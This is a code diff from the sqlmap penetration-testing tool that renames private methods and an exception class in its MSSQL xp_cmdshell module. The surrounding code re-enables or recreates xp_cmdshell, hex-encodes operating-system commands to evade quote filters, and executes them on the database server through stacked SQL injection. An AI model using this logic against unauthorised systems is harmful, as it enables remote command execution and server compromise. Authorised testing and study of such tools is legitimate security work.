@@ -28,7 +28,7 @@ from lib.core.enums import DBMS
 from lib.core.enums import EXPECTED
 from lib.core.enums import HASHDB_KEYS
 from lib.core.enums import PAYLOAD
-from lib.core.exception import sqlmapUnsupportedFeatureException
+from lib.core.exception import SqlmapUnsupportedFeatureException
 from lib.core.threads import getCurrentThreadData
 from lib.request import inject
 
@@ -41,7 +41,7 @@ class Xp_cmdshell:
     def __init__(self):
         self.xpCmdshellStr = "master..xp_cmdshell"
 
-    def __xpCmdshellCreate(self):
+    def _xpCmdshellCreate(self):
         cmd = ""
 
         if Backend.isVersionWithin(("2005", "2008")):
@@ -50,18 +50,18 @@ class Xp_cmdshell:
             cmd = getSQLSnippet(DBMS.MSSQL, "activate_sp_oacreate")
             inject.goStacked(agent.runAsDBMSUser(cmd))
 
-        self.__randStr = randomStr(lowercase=True)
-        self.__xpCmdshellNew = "xp_%s" % randomStr(lowercase=True)
-        self.xpCmdshellStr = "master..%s" % self.__xpCmdshellNew
+        self._randStr = randomStr(lowercase=True)
+        self._xpCmdshellNew = "xp_%s" % randomStr(lowercase=True)
+        self.xpCmdshellStr = "master..%s" % self._xpCmdshellNew
 
-        cmd = getSQLSnippet(DBMS.MSSQL, "create_new_xp_cmdshell", RANDSTR=self.__randStr, XP_CMDSHELL_NEW=self.__xpCmdshellNew)
+        cmd = getSQLSnippet(DBMS.MSSQL, "create_new_xp_cmdshell", RANDSTR=self._randStr, XP_CMDSHELL_NEW=self._xpCmdshellNew)
 
         if Backend.isVersionWithin(("2005", "2008")):
             cmd += ";RECONFIGURE WITH OVERRIDE"
 
         inject.goStacked(agent.runAsDBMSUser(cmd))
 
-    def __xpCmdshellConfigure2005(self, mode):
+    def _xpCmdshellConfigure2005(self, mode):
         debugMsg = "configuring xp_cmdshell using sp_configure "
         debugMsg += "stored procedure"
         logger.debug(debugMsg)
@@ -70,7 +70,7 @@ class Xp_cmdshell:
 
         return cmd
 
-    def __xpCmdshellConfigure2000(self, mode):
+    def _xpCmdshellConfigure2000(self, mode):
         debugMsg = "configuring xp_cmdshell using sp_addextendedproc "
         debugMsg += "stored procedure"
         logger.debug(debugMsg)
@@ -82,21 +82,21 @@ class Xp_cmdshell:
 
         return cmd
 
-    def __xpCmdshellConfigure(self, mode):
+    def _xpCmdshellConfigure(self, mode):
         if Backend.isVersionWithin(("2005", "2008")):
-            cmd = self.__xpCmdshellConfigure2005(mode)
+            cmd = self._xpCmdshellConfigure2005(mode)
         else:
-            cmd = self.__xpCmdshellConfigure2000(mode)
+            cmd = self._xpCmdshellConfigure2000(mode)
 
         inject.goStacked(agent.runAsDBMSUser(cmd))
 
-    def __xpCmdshellCheck(self):
+    def _xpCmdshellCheck(self):
         cmd = "ping -n %d 127.0.0.1" % (conf.timeSec * 2)
         self.xpCmdshellExecCmd(cmd)
 
         return wasLastRequestDelayed()
 
-    def __xpCmdshellTest(self):
+    def _xpCmdshellTest(self):
         threadData = getCurrentThreadData()
         pushValue(threadData.disableStdOut)
         threadData.disableStdOut = True
@@ -160,10 +160,10 @@ class Xp_cmdshell:
 
         # Obfuscate the command to execute, also useful to bypass filters
         # on single-quotes
-        self.__randStr = randomStr(lowercase=True)
+        self._randStr = randomStr(lowercase=True)
         self.__cmd = "0x%s" % hexencode(cmd)
-        self.__forgedCmd = "DECLARE @%s VARCHAR(8000);" % self.__randStr
-        self.__forgedCmd += "SET @%s=%s;" % (self.__randStr, self.__cmd)
+        self._forgedCmd = "DECLARE @%s VARCHAR(8000);" % self._randStr
+        self._forgedCmd += "SET @%s=%s;" % (self._randStr, self.__cmd)
 
         # Insert the command standard output into a support table,
         # 'sqlmapoutput', except when DBMS credentials are provided because
@@ -171,11 +171,11 @@ class Xp_cmdshell:
         # retrieve the output when OPENROWSET is used hence the redirection
         # to a temporary file from above
         if insertIntoTable and not conf.dbmsCred:
-            self.__forgedCmd += "INSERT INTO %s " % insertIntoTable
+            self._forgedCmd += "INSERT INTO %s " % insertIntoTable
 
-        self.__forgedCmd += "EXEC %s @%s" % (self.xpCmdshellStr, self.__randStr)
+        self._forgedCmd += "EXEC %s @%s" % (self.xpCmdshellStr, self._randStr)
 
-        return agent.runAsDBMSUser(self.__forgedCmd)
+        return agent.runAsDBMSUser(self._forgedCmd)
 
     def xpCmdshellExecCmd(self, cmd, silent=False):
         cmd = self.xpCmdshellForgeCmd(cmd)
@@ -237,7 +237,7 @@ class Xp_cmdshell:
             infoMsg += "available, please wait.."
             logger.info(infoMsg)
 
-            result = self.__xpCmdshellCheck()
+            result = self._xpCmdshellCheck()
 
             if result:
                 logger.info("xp_cmdshell extended procedure is available")
@@ -250,9 +250,9 @@ class Xp_cmdshell:
                 choice = readInput(message, default="Y")
 
                 if not choice or choice in ("y", "Y"):
-                    self.__xpCmdshellConfigure(1)
+                    self._xpCmdshellConfigure(1)
 
-                    if self.__xpCmdshellCheck():
+                    if self._xpCmdshellCheck():
                         logger.info("xp_cmdshell re-enabled successfully")
                         kb.xpCmdshellAvailable = True
 
@@ -260,10 +260,10 @@ class Xp_cmdshell:
                         logger.warn("xp_cmdshell re-enabling failed")
 
                         logger.info("creating xp_cmdshell with sp_OACreate")
-                        self.__xpCmdshellConfigure(0)
-                        self.__xpCmdshellCreate()
+                        self._xpCmdshellConfigure(0)
+                        self._xpCmdshellCreate()
 
-                        if self.__xpCmdshellCheck():
+                        if self._xpCmdshellCheck():
                             logger.info("xp_cmdshell created successfully")
                             kb.xpCmdshellAvailable = True
 
@@ -276,7 +276,7 @@ class Xp_cmdshell:
 
             if not kb.xpCmdshellAvailable:
                 errMsg = "unable to proceed without xp_cmdshell"
-                raise sqlmapUnsupportedFeatureException, errMsg
+                raise SqlmapUnsupportedFeatureException, errMsg
 
         debugMsg = "creating a support table to write commands standard "
         debugMsg += "output to"
@@ -286,4 +286,4 @@ class Xp_cmdshell:
         # "The text, ntext, and image data types cannot be compared or sorted"
         self.createSupportTbl(self.cmdTblName, self.tblField, "NVARCHAR(4000)")
 
-        self.__xpCmdshellTest()
+        self._xpCmdshellTest()
